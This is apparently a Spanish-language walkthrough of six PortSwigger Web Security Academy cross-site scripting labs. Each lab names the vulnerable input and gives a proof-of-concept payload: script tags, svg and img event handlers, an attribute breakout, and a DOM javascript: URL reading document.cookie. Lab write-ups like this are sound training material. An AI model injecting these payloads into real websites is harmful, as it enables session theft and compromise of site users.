https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
## LAB 1

El lab cuenta con una barra de busqueda vulnerable a xss reflected, con el clasico alert podemos inyectar codigo:

```
<script>alert(1)</script>
```

## LAB 2

Hay un XSS Stored en la seccion de comentarios sin proteccion alguna:

```
<script>alert(1)</script>
```

## LAB 3

Al igual que en el primer lab tenemos una barra de busqueda, le mandamos un string aleatorio y lo capturamos con Burp Suite. En el repeater vemos que nuestro string lo carga un img src entonces podemos inyectar el siguiente payload:

```
"><svg onload=alert(1)>
```

## LAB 4

En este lab la etiqueta script no le gusta asique probamos el clasico payload con img:

```
<img src=1 onerror=alert(1)>
```

## LAB 5

Este lab es un XSS basado en DOM, si observamos la url existe un parametro que es returnPath, si lo modificamos podemos obtener el document cookie de la siguiente manera:

```
javascript:alert(document.cookie)
```
## LAB 6

Al escribir un string random en la barra de buscar vemos que se guarda en un parametro value entonces cerrando la comilla e inyectando el siguiente codigo podremos hacerlo:

```
"onmouseover="alert(1)
```